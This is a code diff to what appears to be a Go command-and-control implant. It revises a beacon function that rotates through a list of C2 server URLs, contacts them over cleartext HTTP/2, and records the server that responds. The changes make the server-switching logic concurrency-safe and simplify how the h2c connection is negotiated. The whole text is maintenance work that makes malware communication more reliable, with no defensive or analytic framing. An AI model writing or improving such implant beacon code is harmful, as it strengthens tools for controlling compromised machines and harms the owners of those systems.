@@ -30,10 +30,11 @@ var h2cClient = &http.Client{
 }
 
 func sendH2CBeacon(body []byte) []byte {
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
-		c2URL := C2URLs[idx]
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
+		c2URL := urls[idx]
 
 		if !strings.HasPrefix(c2URL, "h2c://") {
 			continue
@@ -58,9 +59,9 @@ func sendH2CBeacon(body []byte) []byte {
 			req.Header.Set(k, v)
 		}
 
-		// Upgrade to HTTP/2 via h2c (Upgrade: h2c)
-		req.Header.Set("Upgrade", "h2c")
-		req.Header.Set("HTTP2-Settings", "")
+		// http2.Transport{AllowHTTP:true} with a plain-TCP DialTLS negotiates
+		// h2c via HTTP/2 prior knowledge (it writes the client preface
+		// directly), so no HTTP/1.1 Upgrade headers are needed or honored.
 
 		resp, err := h2cClient.Do(req)
 		if err != nil {
@@ -82,7 +83,7 @@ func sendH2CBeacon(body []byte) []byte {
 		if err != nil {
 			continue
 		}
-		currentC2Idx = idx
+		currentC2Idx.Store(int32(idx))
 		if Debug {
 			fmt.Printf("[+] H2C Beacon OK from %s, response %d bytes\n", c2URL, len(data))
 		}
